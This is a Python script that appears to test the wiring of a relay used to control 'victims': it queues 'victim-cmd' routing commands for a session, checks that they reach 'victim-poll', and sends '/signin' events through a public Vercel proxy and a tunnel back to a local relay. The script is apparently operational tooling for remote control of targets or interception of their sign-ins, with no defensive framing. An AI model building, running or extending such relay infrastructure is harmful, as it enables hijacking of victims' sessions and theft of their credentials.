#!/usr/bin/env python3
"""Quick check: local relay victim commands + Vercel event proxy (needs live tunnel in FWD)."""
import json
import os
import sys
import urllib.parse
import urllib.request

LOCAL = "http://127.0.0.1:8931"
HARBOR = os.environ.get("HARBOR", "https://harbor-ten-lake.vercel.app")
FWD = os.environ.get("FWD", "").rstrip("/")
SID = os.environ.get("SESSION", "wiring-test")


def post_json(url: str, body: dict) -> dict:
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url, data=data, method="POST", headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())


def get_json(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=15) as r:
        return json.loads(r.read().decode())


def main() -> int:
    try:
        get_json(f"{LOCAL}/")
    except OSError:
        print("FAIL: relay not on 8931 — run harbor-go-remote.ps1 first", file=sys.stderr)
        return 1

    get_json(f"{LOCAL}/relay/reset?session={SID}")
    post_json(
        f"{LOCAL}/relay/victim-cmd",
        {"session": SID, "cmd": {"op": "harbor-route", "path": "/verify"}},
    )
    polled = get_json(f"{LOCAL}/relay/victim-poll?session={SID}")
    if not polled.get("cmds"):
        print("FAIL: harbor-route cmd not in local poll", file=sys.stderr)
        return 1
    print("OK: local harbor-route -> victim-poll")

    if FWD:
        q = urllib.parse.quote(FWD, safe="")
        proxy = f"{HARBOR}/api/relay/event?upstream={q}"
        post_json(
            proxy,
            {
                "session": SID,
                "event": {"type": "meta", "payload": {"path": "/signin"}, "t": 1},
            },
        )
        drained = get_json(f"{LOCAL}/relay/events?session={SID}")
        if not drained.get("events"):
            print("FAIL: Vercel event proxy did not reach tunnel (FWD wrong?)", file=sys.stderr)
            return 1
        print("OK: Vercel event proxy -> tunnel -> local drain")
    else:
        print("skip: set FWD=tunnel URL to test Vercel proxy")

    return 0


if __name__ == "__main__":
    sys.exit(main())
